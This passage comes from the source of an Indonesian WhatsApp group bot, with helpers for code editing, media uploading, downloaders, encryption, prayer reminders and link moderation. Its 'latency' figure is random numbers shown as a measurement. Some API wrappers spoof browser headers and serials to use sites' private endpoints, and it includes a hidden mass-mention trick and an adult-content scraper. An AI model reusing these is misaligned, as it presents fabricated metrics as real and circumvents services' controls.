            if (!line.trim()) return ""
            return pad + line.slice(minIndent)
        }).join("\n")
    }
    
    function findMatchingBrace(source, openIndex) {
        let depth = 0
        let inSingle = false
        let inDouble = false
        let inTemplate = false
        let inLineComment = false
        let inBlockComment = false
        let escaped = false
    
        for (let i = openIndex; i < source.length; i++) {
            const ch = source[i]
            const next = source[i + 1]
    
            if (inLineComment) {
                if (ch === "\n") inLineComment = false
                continue
            }
    
            if (inBlockComment) {
                if (ch === "*" && next === "/") {
                    inBlockComment = false
                    i++
                }
                continue
            }
    
            if (inSingle) {
                if (!escaped && ch === "'") inSingle = false
                escaped = !escaped && ch === "\\"
                continue
            }
    
            if (inDouble) {
                if (!escaped && ch === '"') inDouble = false
                escaped = !escaped && ch === "\\"
                continue
            }
    
            if (inTemplate) {
                if (!escaped && ch === "`") inTemplate = false
                escaped = !escaped && ch === "\\"
                continue
            }
    
            if (ch === "/" && next === "/") {
                inLineComment = true
                i++
                continue
            }
    
            if (ch === "/" && next === "*") {
                inBlockComment = true
                i++
                continue
            }
    
            if (ch === "'") {
                inSingle = true
                escaped = false
                continue
            }
    
            if (ch === '"') {
                inDouble = true
                escaped = false
                continue
            }
    
            if (ch === "`") {
                inTemplate = true
                escaped = false
                continue
            }
    
            if (ch === "{") {
                depth++
            } else if (ch === "}") {
                depth--
                if (depth === 0) return i
            }
        }
    
        return -1
    }
    
    function extractCaseNames(source = "") {
        const regex = /case\s+["'`]([^"'`]+)["'`]\s*:/g
        const result = []
        let match
    
        while ((match = regex.exec(source)) !== null) {
            if (!result.includes(match[1])) result.push(match[1])
        }
    
        return result.sort((a, b) => a.localeCompare(b))
    }
    
    function extractFunctionNameFromCode(code = "") {
        code = stripCodeFence(code)
    
        let match =
            code.match(/async\s+function\s+([A-Za-z_$][\w$]*)\s*\(/) ||
            code.match(/function\s+([A-Za-z_$][\w$]*)\s*\(/) ||
            code.match(/(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*async\b/) ||
            code.match(/(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*\([^)]*\)\s*=>/) ||
            code.match(/(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*[A-Za-z_$][\w$]*\s*=>/)
    
        return match ? match[1] : null
    }
    
    function getFunctionBlockByName(source = "", funcName = "") {
        const name = escapeRegExp(funcName)
    
        const patterns = [
            new RegExp(`async\\s+function\\s+${name}\\s*\\(`, "m"),
            new RegExp(`function\\s+${name}\\s*\\(`, "m"),
            new RegExp(`(?:const|let|var)\\s+${name}\\s*=\\s*async\\s*function\\s*\\(`, "m"),
            new RegExp(`(?:const|let|var)\\s+${name}\\s*=\\s*async\\s*\\([^)]*\\)\\s*=>`, "m"),
            new RegExp(`(?:const|let|var)\\s+${name}\\s*=\\s*\\([^)]*\\)\\s*=>`, "m"),
            new RegExp(`(?:const|let|var)\\s+${name}\\s*=\\s*[A-Za-z_$][\\w$]*\\s*=>`, "m"),
            new RegExp(`(?:const|let|var)\\s+${name}\\s*=\\s*async\\s*[A-Za-z_$][\\w$]*\\s*=>`, "m")
        ]
    
        for (const pattern of patterns) {
            const match = pattern.exec(source)
            if (!match) continue
    
            const startIndex = match.index
            const braceIndex = source.indexOf("{", startIndex)
            if (braceIndex === -1) continue
    
            const endBraceIndex = findMatchingBrace(source, braceIndex)
            if (endBraceIndex === -1) continue
    
            let endIndex = endBraceIndex + 1
    
            while (/\s/.test(source[endIndex] || "")) endIndex++
            if (source[endIndex] === ";") endIndex++
    
            return source.slice(startIndex, endIndex).trim()
        }
    
        return null
    }
    
    function insertFunctionBlock(source = "", block = "") {
        const cleanBlock = normalizeIndent(stripCodeFence(block), 0)
    
        const markerStart = "// ===== AUTO FUNCTION START ====="
        const markerEnd = "// ===== AUTO FUNCTION END ====="
    
        if (source.includes(markerStart) && source.includes(markerEnd)) {
            const insertIndex = source.indexOf(markerEnd)
            return (
                source.slice(0, insertIndex).replace(/\s*$/, "\n\n") +
                cleanBlock + "\n\n" +
                source.slice(insertIndex)
            )
        }
    
        const switchMatch = source.match(/switch\s*\(\s*command\s*\)/)
        if (switchMatch) {
            return (
                source.slice(0, switchMatch.index).replace(/\s*$/, "\n\n") +
                cleanBlock + "\n\n" +
                source.slice(switchMatch.index)
            )
        }
    
        return source.replace(/\s*$/, "\n\n") + cleanBlock + "\n"
    }
    
    async function readQuotedCode(q) {
        if (!q) return ""
    
        const mime = q.mimetype || q.msg?.mimetype || ""
        const fileName = q.fileName || ""
    
        if (
            fileName.endsWith(".js") ||
            mime === "application/javascript" ||
            mime === "text/javascript" ||
            mime === "application/x-javascript"
        ) {
            const buffer = await q.download()
            return buffer.toString("utf8")
        }
    
        if (
            fileName.endsWith(".json") ||
            mime === "application/json" ||
            mime === "text/json"
        ) {
            const buffer = await q.download()
            const raw = buffer.toString("utf8").trim()
    
            try {
                const parsed = JSON.parse(raw)
    
                if (typeof parsed === "string") return parsed
                if (parsed && typeof parsed === "object") {
                    return parsed.code || parsed.body || parsed.function || parsed.func || ""
                }
    
                return ""
            } catch {
                return ""
            }
        }
    
        return (
            q.text ||
            q.caption ||
            q.body ||
            q.message?.conversation ||
            ""
        )
    }
    
    function chunkText(text = "", size = 3500) {
        const chunks = []
        for (let i = 0; i < text.length; i += size) {
            chunks.push(text.slice(i, i + size))
        }
        return chunks
    }
    //═══════════════════════════════════//
    // Fungsi case Ping
    const si = require("systeminformation")
    
    async function createSystemCanvas() {
        const width = 1280
        const height = 720
        const canvas = createCanvas(width, height)
        const ctx = canvas.getContext("2d")
    
        // ===== BACKGROUND =====
        const bg = ctx.createLinearGradient(0, 0, width, height)
        bg.addColorStop(0, "#0b1220")
        bg.addColorStop(1, "#111827")
        ctx.fillStyle = bg
        ctx.fillRect(0, 0, width, height)
    
        // ===== DATA SYSTEM =====
        const cpu = await si.currentLoad()
        const mem = await si.mem()
        const disk = (await si.fsSize())[0]
        const net = (await si.networkStats())[0]
    
        const cpuUsage = cpu.currentLoad.toFixed(0)
        const memUsage = ((mem.used / mem.total) * 100).toFixed(0)
        const diskUsage = disk.use.toFixed(0)
    
        // ===== TITLE =====
        ctx.fillStyle = "#ffffff"
        ctx.font = "bold 36px Sans"
        ctx.fillText("SYSTEM MONITOR", 40, 60)
    
        ctx.font = "18px Sans"
        ctx.fillStyle = "#9ca3af"
        ctx.fillText("Real-time Performance Dashboard", 40, 90)
    
        // ===== LATENCY =====
        ctx.fillStyle = "#10b981"
        ctx.font = "bold 32px Sans"
        ctx.fillText(`${latency()} ms`, width - 180, 60)
    
        ctx.font = "16px Sans"
        ctx.fillStyle = "#9ca3af"
        ctx.fillText("LATENCY", width - 160, 85)
    
        // ===== CARD =====
        function card(x, y, title, value, color) {
            ctx.fillStyle = "#111827"
            ctx.fillRect(x, y, 260, 180)
    
            ctx.fillStyle = "#9ca3af"
            ctx.font = "16px Sans"
            ctx.fillText(title, x + 20, y + 30)
    
            ctx.fillStyle = color
            ctx.font = "bold 42px Sans"
            ctx.fillText(value, x + 20, y + 100)
        }
    
        card(40, 130, "CPU USAGE", `${cpuUsage}%`, "#60a5fa")
        card(340, 130, "MEMORY", `${memUsage}%`, "#34d399")
        card(640, 130, "STORAGE", `${diskUsage}%`, "#a78bfa")
        card(940, 130, "NETWORK RX", `${(net.rx_bytes / 1024).toFixed(2)} KB`, "#22d3ee")
    
        // ===== FOOTER INFO =====
        ctx.fillStyle = "#9ca3af"
        ctx.font = "16px Sans"
    
        ctx.fillText(`Hostname: ${os.hostname()}`, 40, 360)
        ctx.fillText(`Platform: ${os.platform()} (${os.arch()})`, 40, 390)
        ctx.fillText(`Node.js: ${process.version}`, 40, 420)
        ctx.fillText(`Server Uptime: ${runtime(os.uptime())}`, 40, 450)
        ctx.fillText(`Total Memory: ${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB`, 40, 480)
    
        return canvas.toBuffer()
    }
    //═══════════════════════════════════//
    const RunTime = `${runtime(process.uptime())}`
    
    function latency() {
        return (Math.random() * 20 + 5).toFixed(2)
    }
    //═══════════════════════════════════//
    const { addUser, delUser, listUser, deleteAllUsers } = require('../engine/User');
    const { changeKey, getCurrentKey } = require('../engine/MongoDb');
    //═══════════════════════════════════//
    // Time
    const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
    let ucapanWaktu
    if (time >= "19:00:00" && time < "23:59:00") {
    ucapanWaktu = "🌃 Good Night"
    } else if (time >= "15:00:00" && time < "19:00:00") {
        ucapanWaktu = "🌄 Good Afternoon"
    } else if (time >= "11:00:00" && time < "15:00:00") {
    ucapanWaktu = "🏞️ Good Afternoon"
    } else if (time >= "06:00:00" && time < "11:00:00") {
        ucapanWaktu = "🏙️ Good Morning"
    } else {
        ucapanWaktu = "🌆 Good Day"
    }
    //═══════════════════════════════════//
    // Waktu Sholat
		sock.autosholat = sock.autosholat ? sock.autosholat : {}
    let id = m.chat
      if (id in sock.autosholat) { return false }
      let jadwalSholat = {
        shubuh: '04:18',
        dzuhur: '11:49',
        ashar: '15:16',
        magrib: '18:04',
        isya: '19:20',
      }
      const datek = new Date((new Date).toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
      }));
      const hours = datek.getHours();
      const minutes = datek.getMinutes();
      const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
    
      for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
        if (timeNow === waktu) {
          try {
            sock.sendMessage(m.chat, {
              audio: { url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ' },
              mimetype: 'audio/mpeg',
              ptt: true,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true,
                  mediaType: 1,
                  mediaUrl: '',
                  title: `*📢 Allahu Akbar, Allahu Akbar...*
                  ${sholat} nya udah belum?`,
                  body: `🕑 ${waktu}`,
                  sourceUrl: `© ${global.botname}`,
                  thumbnailUrl: global.thumb,
                  renderLargerThumbnail: false
                }
              }
            }, { quoted : m });
            console.log(`Audio Untuk ${sholat} berhasil dikirim`);
    
            sock.autosholat[id] = setTimeout(async () => {
              delete sock.autosholat[m.chat]
            }, 57000)
          } catch (err) {
            console.error('Error Mengirim Pesan:', err)
          }
        }
      }
		//═══════════════════════════════════//
    //======[ Bot ShutDown ] =======//
    async function shutdownBot() {
    let securityData = JSON.parse(fs.readFileSync(securityFile, "utf8"));
    securityData.verified = false; // Nonaktifkan bot
    securityData.attempted = true; // Biarkan attempted tetap true
    fs.writeFileSync(securityFile, JSON.stringify(securityData, null, 2));
    }
    //═══════════════════════════════════//
    async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Terjadi kesalahan:', err);
      return;
    }
    
    const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
    const modifiedData = data.replace(regex, '');
    
    fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
      if (err) {
          console.error('Terjadi kesalahan saat menulis file:', err);
          return;
      }
    
      console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
    });
    });
    }
    //END
    //═══════════════════════════════════//
    const { imageToAscii } = require('../engine/ascii');
    //═══════════════════════════════════//
    async function uploadCatbox(filePath) {
        const form = new FormData();
        form.append("reqtype", "fileupload");
        form.append("fileToUpload", fs.createReadStream(filePath));
    
        const res = await axios.post(
            "https://catbox.moe/user/api.php",
            form,
            {
                headers: form.getHeaders(), // ✅ aman sekarang
                maxBodyLength: Infinity,
            }
        );
    
        if (typeof res.data !== "string" || !res.data.startsWith("https://")) {
            throw new Error("Gagal upload ke Catbox");
        }
    
        return res.data.trim();
    }
    //═══════════════════════════════════//
    
    //═══════════════════════════════════//
    const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    const API = 'https://api.unblurimage.ai/api/upscaler'
    
    function productserial() {
        const raw = [
            UA,
            process.platform,
            process.arch,
            Date.now(),
            Math.random()
        ].join('|')
    
        return crypto.createHash('md5').update(raw).digest('hex')
    }
    
    const product = productserial()
    
    async function uploadvid(filePath) {
        if (!fs.existsSync(filePath)) throw new Error('file not found')
    
        const form = new FormData()
        form.append('video_file_name', path.basename(filePath))
    
        const res = await axios.post(`${API}/v1/ai-video-enhancer/upload-video`,
            form, {
                headers: {
                    ...form.getHeaders(),
                    'user-agent': UA,
                    origin: 'https://unblurimage.ai',
                    referer: 'https://unblurimage.ai/'
                }
            }
        )
    
        return res.data.result
    }
    
    async function putoOss(uploadUrl, filePath) {
        const stream = fs.createReadStream(filePath)
    
        await axios.put(uploadUrl, stream, {
            headers: {
                'content-type': 'video/mp4'
            },
            maxBodyLength: Infinity,
            maxContentLength: Infinity
        })
    }
    
    async function createJob(originalVideoUrl, resolution = '4k', preview = false) {
        const form = new FormData()
        form.append('original_video_file', originalVideoUrl)
        form.append('resolution', resolution)
        form.append('is_preview', preview ? 'true' : 'false')
    
        const res = await axios.post(`${API}/v2/ai-video-enhancer/create-job`,
            form, {
                headers: {
                    ...form.getHeaders(),
                    'user-agent': UA,
                    origin: 'https://unblurimage.ai',
                    referer: 'https://unblurimage.ai/',
                    'product-serial': product
                }
            }
        )
    
        if (res.data?.code !== 100000) {
            throw new Error(JSON.stringify(res.data))
        }
    
        return res.data.result.job_id
    }
    
    async function getjob(jobId) {
        const res = await axios.get(`${API}/v2/ai-video-enhancer/get-job/${jobId}`, {
            headers: {
                'user-agent': UA,
                origin: 'https://unblurimage.ai',
                referer: 'https://unblurimage.ai/',
                'product-serial': product
            }
        })
    
        return res.data
    }
    
    async function pollJob(jobId, interval = 5000) {
        while (true) {
            const res = await getjob(jobId)
    
            if (res.code === 100000 && res.result?.output_url) {
                return res.result
            }
    
            if (res.code !== 300010) {
                throw new Error(JSON.stringify(res))
            }
    
            await new Promise(r => setTimeout(r, interval))
        }
    }
    
    async function videoenhancer(buffer, resolution = '4k') {
        let video = `./video-${Date.now()}.mp4`
        fs.writeFileSync(video, buffer)
    
        const upload = await uploadvid(video)
        await putoOss(upload.url, video)
        fs.unlinkSync(video);
    
        const cdnUrl = 'https://cdn.unblurimage.ai/' + upload.object_name
        const jobId = await createJob(cdnUrl, resolution, false)
        const result = await pollJob(jobId)
    
        return {
            job_id: jobId,
            input_url: result.input_url,
            output_url: result.output_url
        }
    }
    //═══════════════════════════════════//
    //FUNCTION TIKTOK DOWNLOADER
    async function tiktok2(query) {
      return new Promise(async (resolve, reject) => {
        try {
          const encodedParams = new URLSearchParams();
          encodedParams.set('url', query);
          encodedParams.set('hd', '1');
          
          const response = await axios({
            method: 'POST',
            url: 'https://tikwm.com/api/',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'Cookie': 'current_language=en',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
            },
            data: encodedParams
          });
          const videos = response.data.data;
          const result = {
            title: videos.title,
            cover: videos.cover,
            origin_cover: videos.origin_cover,
            no_watermark: videos.play,
            watermark: videos.wmplay,
            music: videos.music
          };
          resolve(result);
        } catch (error) {
          reject(error);
        }
      });
    }
    //END
    //═══════════════════════════════════//
    async function removeBg(buffer) {
        try {
            const axios = require('axios')
            const FormData = require('form-data')
    
            const form = new FormData()
            form.append('file', buffer, {
                filename: 'image.jpg',
                contentType: 'image/jpeg'
            })
    
            const { data } = await axios.post(
                'https://removebg.one/api/predict/v2',
                form,
                {
                    headers: {
                        ...form.getHeaders(),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10)',
                        accept: 'application/json, text/plain, */*',
                        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                        platform: 'PC',
                        'sec-ch-ua-platform': '"Android"',
                        origin: 'https://removebg.one',
                        referer: 'https://removebg.one/upload'
                    },
                    maxBodyLength: Infinity,
                    maxContentLength: Infinity
                }
            )
    
            return data
        } catch (e) {
            return null
        }
    }
    //═══════════════════════════════════//
    async function downloadToBuffer(message) {
        const type = Object.keys(message)[0];
        const stream = await downloadContentFromMessage(message[type], type);
    
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    }
    //═══════════════════════════════════//
    async function imageToUrl(buffer) {
        const form = new FormData();
        form.append("fileToUpload", buffer, "image.jpg");
        form.append("reqtype", "fileupload");
    
        const res = await axios.post(
            "https://catbox.moe/user/api.php",
            form,
            { headers: form.getHeaders() }
        );
    
        return res.data;
    }
    //═══════════════════════════════════//
    // Fungsi teks melingkar di bagian atas
    function drawCircularTextTop(ctx, text, centerX, centerY, radius, badgeImage) {
      const fontSize = 72
      const strokeWidth = 3
      const strokeColor = '#000'
      const arcSpan = Math.PI * 0.7
      const textRadius = radius + 75
      const chars = text.split('')
      const n = chars.length
      const angleIncrement = n > 1 ? arcSpan / (n - 1) : 0
      const start = Math.PI / 2 + arcSpan / 2
    
      for (let i = 0; i < n; i++) {
        const char = chars[i]
        const angle = start - i * angleIncrement
        const x = centerX + Math.cos(angle) * textRadius
        const y = centerY + Math.sin(angle) * textRadius
    
        ctx.save()
        ctx.translate(x, y)
        ctx.rotate(angle - Math.PI / 2)
        ctx.lineWidth = strokeWidth
        ctx.strokeStyle = strokeColor
        ctx.strokeText(char, 0, 0)
        ctx.fillText(char, 0, 0)
        ctx.restore()
      }
    
      // Tambahkan badge jika verified
      if (badgeImage) {
        const endAngle = start - (n - 1) * angleIncrement
        const badgeAngle = endAngle - angleIncrement
        const badgeSize = Math.round(fontSize * 0.9)
        const bx = centerX + Math.cos(badgeAngle) * textRadius
        const by = centerY + Math.sin(badgeAngle) * textRadius
        ctx.drawImage(badgeImage, bx - badgeSize / 2, by - badgeSize / 2, badgeSize, badgeSize)
      }
    }
    //═══════════════════════════════════//
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    //═══════════════════════════════════//
    // pp for QC //    
    let ppuser
      try {
        ppuser = await sock.profilePictureUrl(m.sender, 'image')
      } catch (err) {
      ppuser = `${global.thumb}`;
    }
    //END
    //═══════════════════════════════════//
    const AdmZip = require('adm-zip');
    
    // common helpers
    function stripBackticks(s) {
        if (!s) return s;
        s = s.trim();
        if (s.startsWith('```') && s.endsWith('```')) {
            s = s.replace(/^```[\w]*\n?/, '').replace(/```$/, '');
        }
        if (s.startsWith('`') && s.endsWith('`')) {
            s = s.replace(/^`+/, '').replace(/`+$/, '');
        }
        return s.trim();
    }
    
    async function getQuotedBuffer(msg) {
        try {
            const q = msg.quoted ? msg.quoted : null;
            if (!q) return null;
            const buff = await q.download?.();
            return buff || null;
        } catch (e) {
            return null;
        }
    }
    
    function getQuotedFileName(msg) {
        try {
            const q = msg.quoted;
            if (!q) return null;
            const fileName =
                q.filename ||
                q.fileName ||
                q.msg?.fileName ||
                q.msg?.documentMessage?.fileName ||
                q.message?.documentMessage?.fileName ||
                null;
            return fileName;
        } catch (e) {
            return null;
        }
    }
    
    // bracket balance simple checker
    function checkBracketsBalance(s) {
        const stack = [];
        const pairs = { ')': '(', ']': '[', '}': '{' };
        for (let i = 0; i < s.length; i++) {
            const ch = s[i];
            if (ch === '(' || ch === '[' || ch === '{') stack.push({ ch, i });
            if (ch === ')' || ch === ']' || ch === '}') {
                const top = stack.pop();
                if (!top || top.ch !== pairs[ch]) {
                    return { ok: false, pos: i, expected: pairs[ch], found: ch };
                }
            }
        }
        if (stack.length > 0) {
            const top = stack.pop();
            return { ok: false, pos: top.i, expected: null, found: top.ch, reason: 'Unclosed opening bracket' };
        }
        return { ok: true };
    }
    //═══════════════════════════════════//
    // --- AES helpers ---
    // returns base64 string prefixed with "AES:"
    function encryptAESBuffer(buffer, passphrase) {
        const salt = crypto.randomBytes(16);
        const key = crypto.scryptSync(passphrase, salt, 32); // 32 bytes key
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
        const encrypted = Buffer.concat([cipher.update(buffer), cipher.final()]);
        const out = Buffer.concat([salt, iv, encrypted]); // salt(16) | iv(16) | ciphertext
        return 'AES:' + out.toString('base64');
    }
    
    function decryptAESBase64String(aesBase64Str, passphrase) {
        // aesBase64Str is base64 of salt+iv+ciphertext (without 'AES:' prefix)
        const raw = Buffer.from(aesBase64Str, 'base64');
        if (raw.length < 32) throw new Error('Data AES terlalu pendek.');
        const salt = raw.slice(0, 16);
        const iv = raw.slice(16, 32);
        const ciphertext = raw.slice(32);
        const key = crypto.scryptSync(passphrase, salt, 32);
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        return decrypted; // Buffer
    }
    
    // --- Generic helpers ---
    function toBase64Buffer(buf) {
        return Buffer.from(buf).toString('base64');
    }
    
    function fromBase64StringToBuffer(str) {
        return Buffer.from(str, 'base64');
    }
    
    // sanitize backticks if user paste in ```...```
    function stripBackticks(s) {
        if (!s) return s;
        s = s.trim();
        if (s.startsWith('```') && s.endsWith('```')) {
            s = s.replace(/^```[\w]*\n?/, '').replace(/```$/, '');
        }
        if (s.startsWith('`') && s.endsWith('`')) {
            s = s.replace(/^`+/, '').replace(/`+$/, '');
        }
        return s.trim();
    }
    //═══════════════════════════════════//
    async function randomNsFw() {
      return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/' + page).then((data) => {
          const $ = cheerio.load(data.data)
          const hasil = []
          $('#primary > div > div > ul > li > article').each(function (a, b) {
            hasil.push({
              title: $(b).find('header > h2').text(),
              link: $(b).find('header > h2 > a').attr('href'),
              category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
              share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
              views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
              type: $(b).find('source').attr('type') || 'image/jpeg',
              video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
              video_2: $(b).find('video > a').attr('href') || ''
            })
          })
          resolve(hasil)
        })
      })
    }
    //═══════════════════════════════════//
    // if (prefix === '@' && !['everyone','semua','all','member','here'].includes(command)) return
    
    // bisa kata, simbol, emoji, apapun
    const fakeTagKeywords = [
        '@everyone',
        '@semua',
        '@all',
        'member',
        '@here',
        '@halo',
        '@anjay',
        '@gelo',
        '@kelazz🔥',
        '@gaskeun'
    ]
    // ===== AUTO INVISIBLE FAKE TAG (CUSTOM KEYWORD) =====
    if (m.isGroup && !m.key.fromMe && typeof body === 'string') {
        const text = body.toLowerCase().trim()
        
        const isTrigger = fakeTagKeywords.map(v => v.toLowerCase())
              .includes(text.toLowerCase())
          
        if (isTrigger) {
            if(!isOwner) return; 
            const meta = await sock.groupMetadata(m.chat)
            const members = meta.participants.map(v => v.id)
    
            // jangkar mention (WA butuh 1 jid asli)
            const anchor =
                meta.owner ||
                meta.participants.find(p => p.admin)?.id ||
                members[0]
    
            // zero width (invisible)
            const zw = '\u200b'.repeat(8)
    
            // teks palsu (kelihatan kosong / nipu)
            const fakeInvisible = `${text}${zw}`
    
            await sock.sendMessage(m.chat, {
                text: fakeInvisible,
                contextInfo: {
                    mentionedJid: [anchor, ...members]
                }
            })
    
            return
        }
    }
    //═══════════════════════════════════//
    const blockJpmPath = './engine/Storage//blockjpm.json'
    
    const getBlockJpm = () => {
        if (!fs.existsSync(blockJpmPath)) fs.writeFileSync(blockJpmPath, '[]')
        return JSON.parse(fs.readFileSync(blockJpmPath))
    }
    
    const saveBlockJpm = (data) => {
        fs.writeFileSync(blockJpmPath, JSON.stringify(data, null, 2))
    }
    //═══════════════════════════════════//
    /*const chPath = './database/listidch.json'
    let channelJpm = fs.existsSync(chPath)
      ? JSON.parse(fs.readFileSync(chPath))
      : []
    
    const saveCh = () =>
      fs.writeFileSync(chPath, JSON.stringify(channelJpm, null, 2))*/
    //═══════════════════════════════════//
    const newsletterPath = './engine/Storage/listidch.json'
    const getNewsletter = () => {
        if (!fs.existsSync(newsletterPath)) fs.writeFileSync(newsletterPath, '[]')
        return JSON.parse(fs.readFileSync(newsletterPath))
    }
    
    const saveNewsletter = (data) => {
        fs.writeFileSync(newsletterPath, JSON.stringify(data, null, 2))
    }
    //===================================
    //Anti Tag SW
    if (
      m.isGroup &&
      m.mtype === 'groupStatusMentionMessage' &&
      antiSW[m.chat] === true ) {
        const groupMetadata = await sock.groupMetadata(m.chat);
        const groupAdmins = groupMetadata.participants
        .filter(p => p.admin)
        .map(p => p.id);

        const isAdmins = groupAdmins.includes(m.sender);

        if (!isAdmins) {
          // Hapus pesan jika key.id tersedia
          if (m.key && m.key.id) {
            await sock.sendMessage(m.chat, {
              delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: sender
              }
            });
          }

          // Kirim balasan
          await sock.sendMessage(m.chat, {
            text: `🚫 *Dilarang tag grup dalam status!*`,
            mentions: [sender]
          }, { quoted: m });
        }
      }
    //═══════════════════════════════════//
      //Antilink Group
      if (antilinkGroups.includes(m.chat) || AntiLinkKick.includes(m.chat)) {
      if (!isBotAdmins) return;

      if (!isAdmins && !isOwner && !m.fromMe) {
        let sender = m.sender;
        let senderTag = `@${sender.split("@")[0]}`;
        let isKickMode = AntiLinkKick.includes(m.chat);
        let linkRegex = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;

        if (linkRegex.test(m.text)) {
          // Hapus pesan yang mengandung link
          await sleep(3000)
          await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: sender }});

          // Jika mode kick, langsung keluarkan pengguna
          if (isKickMode) {
              await sock.groupParticipantsUpdate(m.chat, [sender], "remove");
              await sock.sendMessage(m.chat, { text: `🚨 User ${senderTag} telah di kick karena mengirim link !`, mentions: [sender] });
          } 
        }
      }
    }
    //═══════════════════════════════════//
    if (AntiLinkAll.includes(m.chat)) {
      if (!isBotAdmins) return;

      if (!isAdmins && !isOwner && !m.fromMe) {
        var linkRegex = /(https?:\/\/[^\s]+)/gi;
        if (linkRegex.test(m.text)) {
          let sender = m.sender;
          let senderTag = `@${sender.split("@")[0]}`;

          // Hapus pesan yang mengandung link
          await sleep(500)
          await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: sender }});
        }
      }
    }
    //═══════════════════════════════════//
    async function unfollAllCh(sock) {
      try {
        const data = await sock.newsletterFetchAllSubscriptions()
        if (!data?.newsletters?.length) {
          console.log("bot tidak follow chanel apapun")
          return
        }
    
        for (let ch of data.newsletters) {
          const jid = ch.id      
          const role =
            ch.viewer_metadata?.role ||
            ch.role ||
            ch.viewerRole ||
            "UNKNOWN"
            
          if (role === "ADMIN" || role === "OWNER") {
            console.log(`Skip (Admin/Owner): ${jid}`)
            continue
          }
    
          console.log(`unfoll ch : ${jid}`)
          await sock.newsletterUnfollow(jid)
          await new Promise(x => setTimeout(x, 2000))
        }
        console.log("done unfoll all ch kecuali ch yg admin/owner")
      } catch (err) {
        console.error("error: ", err)
      }
    }
    //===================================
    //STIKER AND BRAT FUNCTION
    console.log(fs.existsSync('./engine/Assets/thumb.jpg'))
    const {
      imageToWebp, 
      videoToWebp, 
      writeExifImg, 
      writeExifVid, 
      writeExif, 
      addExif 
    } = require('../engine/exif')
      //===================================
      function getRandomFile(ext) {
          return `${Math.floor(Math.random() * 10000)}${ext}`;
      }
      async function makeStickerFromUrl(imageUrl, sock, m) {
        try {
          let buffer;
          if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
          } else {
              const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
              buffer = Buffer.from(response.data, "binary");
            }
              
          const webpBuffer = await Sharp(buffer)
          .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
          .webp({ quality: 70 })
          .toBuffer();
              
          const jsonBefore = await addExif(webpBuffer, '𝘿𝙧𝙞𝙘', '𝙄𝙩𝙨𝙨 𝘿𝙧𝙞𝙘')
  
          const fileName = getRandomFile(".webp");
          fs.writeFileSync(fileName, webpBuffer);
  
          await sock.sendMessage(m.chat, {
            sticker: jsonBefore,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: [sender],
              forwardedNewsletterMessageInfo: {
                  newsletterName: global.namaSaluran,
                  newsletterJid: global.idSaluran,
              },
              externalAdReply: {
                showAdAttribution: true,
                title: "𝙄𝙩𝙨𝙨 𝘿𝙧𝙞𝙘",
                body: global.footer,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: global.thumb, 
                sourceUrl: `https://whatsapp.com/channel/0029Vb7edAwInlqWMunfIp3g`
              }
            }
          }, { quoted: m });
  
          fs.unlinkSync(fileName);
        } catch (error) {
          console.error("Error creating sticker:", error);
          reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
        }
      }
      //===================================
      async function getFile(url) {
        try {
            const response = await axios({
                method: 'GET',
                url: url,
                responseType: 'arraybuffer'
            });
            const tempPath = path.join(__dirname, 'temp.png'); // Simpan sebagai PNG sementara
            const webpPath = path.join(__dirname, 'temp.webp'); // Simpan hasil WebP
            
            // Simpan file asli (PNG/JPG)
            fs.writeFileSync(tempPath, response.data);
            // Konversi ke WebP menggunakan Sharp
            await Sharp(tempPath)
                .toFormat('webp')
                .toFile(webpPath);
            // Hapus file asli setelah dikonversi
            fs.unlinkSync(tempPath);
            return {
                data: webpPath,
                mimetype: 'image/webp'
            };
        } catch (error) {
            console.error('Gagal mengambil file:', error);
            return null;
        }
      }
      //===================================
